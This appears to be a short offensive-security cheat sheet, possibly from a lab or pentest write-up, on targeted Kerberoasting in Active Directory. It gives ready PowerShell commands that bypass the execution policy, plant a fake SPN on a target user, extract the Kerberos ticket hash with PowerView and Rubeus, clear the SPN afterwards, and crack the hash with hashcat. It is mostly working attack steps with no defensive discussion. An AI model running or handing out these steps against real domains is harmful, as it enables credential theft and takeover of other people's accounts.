
## `PowerView`

```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
```
#### Check first if account Rita has an SPN
```powershell
Get-DomainUser <TARGET_USER> | Select serviceprincipalname
```
<img width="1276" height="144" alt="Pasted image 20251226231348" src="https://github.com/user-attachments/assets/9261895b-7cce-4010-9b6d-802fbf51800a" />
#### **Sets (overwrites) the Service Principal Name (SPN)** of the Active Directory object `rita` to a fake value (`nonexistent/BLAHBLAH`).
```powershell
Set-DomainObject -Identity <TARGET_USER> -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
```
<img width="1720" height="232" alt="Pasted image 20251226231729" src="https://github.com/user-attachments/assets/a4302f76-4066-4b0c-b705-fa3107100dd5" />

#### Using `PowerView` for the Fake SPN to get the hash:  
```powershell
$User = Get-DomainUser <TARGET_USER>
$User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
```
<img width="1778" height="323" alt="Pasted image 20251226231958" src="https://github.com/user-attachments/assets/2ff3f1fe-fa24-4a63-9165-483aabb7bd98" />
#### Using `Rubeus` for the Fake SPN to get the hash:  
   - Use **Rubeus** to `Kerberoast` the user and retrieve the hash:  
```powershell
.\Rubeus.exe kerberoast /user:TARGET_USER /nowrap
```  
<img width="1557" height="519" alt="Pasted image 20260101200407" src="https://github.com/user-attachments/assets/d5148297-dcc6-4adf-8357-61d3825b5683" />
#### Clearing the SPNs of Rita
```powershell
Set-DomainObject -Identity <TARGET_USER> -Clear serviceprincipalname -Verbose
```
#### Cracking the `Kerberoastable` Hash
```shell
hashcat -m 13100 /hash /usr/share/wordlists/rockyou.txt --force
```
